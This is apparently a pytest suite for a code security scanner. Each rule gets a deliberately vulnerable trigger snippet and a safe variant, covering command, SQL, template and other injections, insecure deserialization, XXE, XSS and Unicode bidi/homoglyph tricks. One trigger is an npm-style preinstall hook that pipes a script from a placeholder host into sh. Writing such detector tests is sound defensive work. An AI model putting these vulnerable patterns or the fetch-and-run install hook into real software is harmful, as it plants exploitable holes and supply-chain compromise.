from __future__ import annotations

from typing import Dict, Tuple

import pytest

from fortress_scan.core.config import Config
from fortress_scan.core.engine import scan_source
from fortress_scan.core.registry import all_rules
from fortress_scan.languages import JAVA, JAVASCRIPT, MANIFEST, PYTHON, SHELL

BIDI_OVERRIDE = chr(0x202E)
ZERO_WIDTH_SPACE = chr(0x200B)
CYRILLIC_A = chr(0x0430)
FORM_FEED = chr(0x0C)


def rule_ids(language: str, source: str):
    return [f.rule_id for f in scan_source(source, language, "mau", Config())]


TRIGGERS: Dict[str, Tuple[str, str]] = {
    "FSB-CMD-001": (
        PYTHON,
        "import os\nfrom flask import request\n"
        "def h():\n    os.system('ping ' + request.args.get('h'))\n",
    ),
    "FSB-CMD-002": (
        PYTHON,
        "import subprocess\nfrom flask import request\n"
        "def h():\n    subprocess.run(request.args.get('prog'))\n",
    ),
    "FSB-CMD-003": (
        PYTHON,
        "import os\ndef h(muc_tieu):\n    os.system('ping ' + muc_tieu)\n",
    ),
    "FSB-CMD-004": (
        SHELL,
        "#!/bin/bash\nTARGET=$1\nrsync -a ./dist/ $TARGET\n",
    ),
    "FSB-DESER-001": (
        PYTHON,
        "import pickle\nfrom flask import request\n"
        "def h():\n    return pickle.loads(request.get_data())\n",
    ),
    "FSB-DESER-002": (
        PYTHON,
        "import pickle\n"
        "def doc(duong_dan):\n"
        "    with open(duong_dan, 'rb') as f:\n        return pickle.loads(f.read())\n",
    ),
    "FSB-EL-001": (
        JAVA,
        "public class H {\n"
        "  public void run(HttpServletRequest request) {\n"
        '    String q = request.getParameter("q");\n'
        "    parser.parseExpression(q).getValue();\n"
        "  }\n"
        "}\n",
    ),
    "FSB-EXEC-001": (
        PYTHON,
        "from flask import request\ndef h():\n    return eval(request.args.get('e'))\n",
    ),
    "FSB-EXEC-002": (
        PYTHON,
        "def tinh(bieu_thuc):\n    return eval(bieu_thuc)\n",
    ),
    "FSB-IMPORT-001": (
        PYTHON,
        "import importlib\nfrom flask import request\n"
        "def h():\n    return importlib.import_module(request.args.get('m'))\n",
    ),
    "FSB-IMPORT-002": (
        PYTHON,
        "import importlib\ndef nap(ten):\n    return importlib.import_module(ten)\n",
    ),
    "FSB-LDAP-001": (
        PYTHON,
        "from flask import request\n"
        "def tim(conn):\n"
        "    return conn.search_s('dc=x', 2, '(uid=' + request.args.get('u') + ')')\n",
    ),
    "FSB-NOSQL-001": (
        PYTHON,
        "from flask import request\n"
        "def h(col):\n    return col.find({'$where': request.args.get('f')})\n",
    ),
    "FSB-REFL-001": (
        PYTHON,
        "from flask import request\n"
        "def h(doi_tuong):\n    return getattr(doi_tuong, request.args.get('f'))\n",
    ),
    "FSB-SQL-001": (
        PYTHON,
        "from flask import request\n"
        "def h(cursor):\n"
        '    cursor.execute(f"SELECT * FROM users WHERE n = \'{request.args.get(\'n\')}\'")\n',
    ),
    "FSB-SQL-002": (
        PYTHON,
        "def tim(cursor, ma):\n    cursor.execute('SELECT * FROM users WHERE id = ' + ma)\n",
    ),
    "FSB-SUP-001": (
        MANIFEST,
        '{\n  "scripts": {\n'
        '    "preinstall": "curl -sSL https://example.invalid/s.sh | sh"\n  }\n}\n',
    ),
    "FSB-SUP-002": (
        MANIFEST,
        '{\n  "scripts": {\n'
        '    "postinstall": "node -e \\"require(\'./x\').run()\\""\n  }\n}\n',
    ),
    "FSB-TMPL-001": (
        PYTHON,
        "from flask import request\nfrom jinja2 import Template\n"
        "def h():\n    return Template(request.args.get('t')).render()\n",
    ),
    "FSB-TMPL-002": (
        PYTHON,
        "from jinja2 import Template\ndef ve(noi_dung):\n    return Template(noi_dung).render()\n",
    ),
    "FSB-UNI-001": (
        PYTHON,
        "duyet = False\n# %s return duyet\n" % BIDI_OVERRIDE,
    ),
    "FSB-UNI-002": (
        PYTHON,
        "def kiem%s_tra(u):\n    return True\n" % ZERO_WIDTH_SPACE,
    ),
    "FSB-UNI-003": (
        PYTHON,
        "m" + CYRILLIC_A + "tkhau = 'admin'\n",
    ),
    "FSB-UNI-004": (
        PYTHON,
        "duyet = False\n# ghi chu%sduyet = True\n" % FORM_FEED,
    ),
    "FSB-XML-001": (
        PYTHON,
        "from lxml import etree\nparser = etree.XMLParser(resolve_entities=True)\n",
    ),
    "FSB-XPATH-001": (
        PYTHON,
        "from flask import request\n"
        "def tim(tree):\n"
        "    return tree.xpath('//user[name=\"' + request.args.get('n') + '\"]')\n",
    ),
    "FSB-XSS-001": (
        JAVASCRIPT,
        "function ve(o, req) {\n  const bio = req.body.bio;\n  o.innerHTML = bio;\n}\n",
    ),
}

SAFE_VARIANTS: Dict[str, Tuple[str, str]] = {
    "FSB-CMD-001": (
        PYTHON,
        "import os\nimport shlex\nfrom flask import request\n"
        "def h():\n    os.system('ping ' + shlex.quote(request.args.get('h')))\n",
    ),
    "FSB-CMD-002": (
        PYTHON,
        "import subprocess\nfrom flask import request\n"
        "def h():\n    subprocess.run(['ping', '-c', '1', '--', request.args.get('h')])\n",
    ),
    "FSB-CMD-003": (
        PYTHON,
        "import os\ndef h():\n    os.system('ping -c 1 localhost')\n",
    ),
    "FSB-CMD-004": (
        SHELL,
        '#!/bin/bash\nTARGET=$1\nrsync -a ./dist/ "$TARGET"\n',
    ),
    "FSB-DESER-001": (
        PYTHON,
        "import json\nfrom flask import request\n"
        "def h():\n    return json.loads(request.get_data())\n",
    ),
    "FSB-DESER-002": (
        PYTHON,
        "import json\n"
        "def doc(duong_dan):\n"
        "    with open(duong_dan) as f:\n        return json.loads(f.read())\n",
    ),
    "FSB-EXEC-001": (
        PYTHON,
        "from flask import request\ndef h():\n    return int(request.args.get('n')) + 1\n",
    ),
    "FSB-EXEC-002": (
        PYTHON,
        "def tinh():\n    return eval('1 + 1')\n",
    ),
    "FSB-IMPORT-001": (
        PYTHON,
        "import importlib\nfrom flask import request\n"
        "CHO_PHEP = {'json': 'json', 'csv': 'csv'}\n"
        "def h():\n    return importlib.import_module(CHO_PHEP[request.args.get('m')])\n",
    ),
    "FSB-IMPORT-002": (
        PYTHON,
        "import importlib\ndef nap():\n    return importlib.import_module('json')\n",
    ),
    "FSB-NOSQL-001": (
        PYTHON,
        "from flask import request\n"
        "def h(col):\n    return col.find({'ten': str(request.args.get('f'))})\n",
    ),
    "FSB-SQL-001": (
        PYTHON,
        "from flask import request\n"
        "def h(cursor):\n"
        "    cursor.execute('SELECT * FROM users WHERE n = ?', (request.args.get('n'),))\n",
    ),
    "FSB-SQL-002": (
        PYTHON,
        "def tim(cursor, ma):\n"
        "    cursor.execute('SELECT * FROM users WHERE id = ?', (ma,))\n",
    ),
    "FSB-SUP-001": (
        MANIFEST,
        '{\n  "scripts": {\n    "build": "tsc --build",\n    "test": "jest"\n  }\n}\n',
    ),
    "FSB-TMPL-001": (
        PYTHON,
        "from flask import request, render_template\n"
        "def h():\n    return render_template('trang.html', ten=request.args.get('t'))\n",
    ),
    "FSB-TMPL-002": (
        PYTHON,
        "from jinja2 import Template\ndef ve():\n    return Template('xin chao').render()\n",
    ),
    "FSB-UNI-001": (PYTHON, "duyet = False\n# return duyet\n"),
    "FSB-UNI-002": (PYTHON, "def kiem_tra(u):\n    return True\n"),
    "FSB-UNI-003": (PYTHON, "matkhau = 'admin'\n"),
    "FSB-UNI-004": (PYTHON, "duyet = False\n# ghi chu\tduyet = True\n"),
    "FSB-XML-001": (
        PYTHON,
        "from lxml import etree\nparser = etree.XMLParser(resolve_entities=False)\n",
    ),
    "FSB-XSS-001": (
        JAVASCRIPT,
        "function ve(o, req) {\n  const bio = req.body.bio;\n  o.textContent = bio;\n}\n",
    ),
}


def test_every_registered_rule_has_a_trigger():
    registered = {rule.id for rule in all_rules()}
    missing = sorted(registered - set(TRIGGERS))
    assert missing == [], (
        "cac rule sau chua co mau kich hoat trong TRIGGERS, "
        "moi rule moi bat buoc phai co: %s" % missing
    )


def test_no_trigger_refers_to_an_unknown_rule():
    registered = {rule.id for rule in all_rules()}
    unknown = sorted(set(TRIGGERS) - registered)
    assert unknown == [], "TRIGGERS nhac toi rule khong ton tai: %s" % unknown


@pytest.mark.parametrize("rule_id", sorted(TRIGGERS))
def test_rule_fires_on_its_trigger(rule_id: str):
    language, source = TRIGGERS[rule_id]
    found = rule_ids(language, source)
    assert rule_id in found, "%s khong kich hoat; thuc te nhan duoc: %s" % (rule_id, found)


@pytest.mark.parametrize("rule_id", sorted(SAFE_VARIANTS))
def test_rule_stays_silent_on_safe_variant(rule_id: str):
    language, source = SAFE_VARIANTS[rule_id]
    found = rule_ids(language, source)
    assert rule_id not in found, "%s bao nham tren ma an toan; nhan duoc: %s" % (rule_id, found)
